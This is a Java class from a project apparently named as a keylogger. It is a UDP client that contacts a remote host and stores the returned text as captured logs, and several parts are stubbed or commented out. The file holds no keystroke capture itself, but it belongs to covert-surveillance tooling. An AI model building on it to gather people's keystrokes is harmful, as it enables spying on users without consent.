package com.hao.keylogger.controllers.Client;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Date;

import com.hao.keylogger.models.Log;

public class UDPClientHelper {
	public enum RequestCommand {
		GET_LOG
	}
	
	private static UDPClientHelper instance;
	
	private DatagramSocket socket;
	private InetAddress address;
	private String hostName;
	private int port;
	
	byte[] buffer = new byte[8096]; // 8KB 
	
	/**
	 * Create new socket
	 * @param inetAddress
	 * @param port
	 * @throws SocketException
	 * @throws UnknownHostException
	 */
	public UDPClientHelper(InetAddress inetAddress, int port) throws SocketException, UnknownHostException {
		socket = new DatagramSocket();
		address = inetAddress;
		this.port = port;
	}
	/*
	public static UDPClientHelper getInstance(InetAddress inetAddress, int port) {
		if (instance == null) {
			try {
				instance = new UDPClientHelper(inetAddress, port);
			} catch (SocketException e) {
				e.printStackTrace();
			} catch (UnknownHostException e) {
				e.printStackTrace();
			}
		}
		return instance;
	}
	*/
	
	public DatagramSocket getSocket() {
		return socket;
	}

	public void setSocket(DatagramSocket socket) {
		this.socket = socket;
	}

	public InetAddress getAddress() {
		return address;
	}

	public void setAddress(InetAddress address) {
		this.address = address;
	}

	public String getHostName() {
		return hostName;
	}

	public void setHostName(String hostName) {
		this.hostName = hostName;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}
	/*
	public void connect() throws SocketException, UnknownHostException{
			socket = new DatagramSocket();
			address = InetAddress.getByName(hostName);
	}
	*/
	/**
	 * fetch a single log by specified date
	 * @param date
	 * @return
	 */
	public Log fetchLog(Date date) {
		// TODO get from server, convert to Log object, pass to controller
		Log log = new Log();
		//log.setContent(date.toString());
		String msg = "Hi server";
		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
		try {
			socket.send(outPacket);
		} catch (IOException e) {
			e.printStackTrace();
		}
		// waiting for the server message
		String receiveMsg = receivePacket();
		
		log.setDateOfLog(date);
		log.setHost(address);
		log.setPort(port);
		log.setContent(receiveMsg);
		
		return log;
	}
	private String receivePacket() {
		DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
		String receiveMsg = "";
		try {
			socket.receive(inPacket);
			receiveMsg = new String(inPacket.getData(), 0, inPacket.getLength());
		}
		catch (IOException ex) {
			ex.printStackTrace();
		}
		return receiveMsg;
	}
	/**
	 * get all logs stored on host
	 * @return
	 */
	public ArrayList<Log> fetchAllLogs() {
		ArrayList<Log> logs = new ArrayList<Log>();
		logs.add(fetchLog(new Date()));
		return logs;
	}
	/*
	private class PacketReceiver implements Runnable {
		byte[] buffer = new byte[8096]; // 8KB 
		@Override
		public void run() {
			DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
			//while (true) {
				try {
					socket.receive(inPacket);
					String inMsg = new String(inPacket.getData(), 0, inPacket.getLength());
				}
				catch (IOException ex) {
					ex.printStackTrace();
				}
			//}
		}
		
	}
*/
	
}
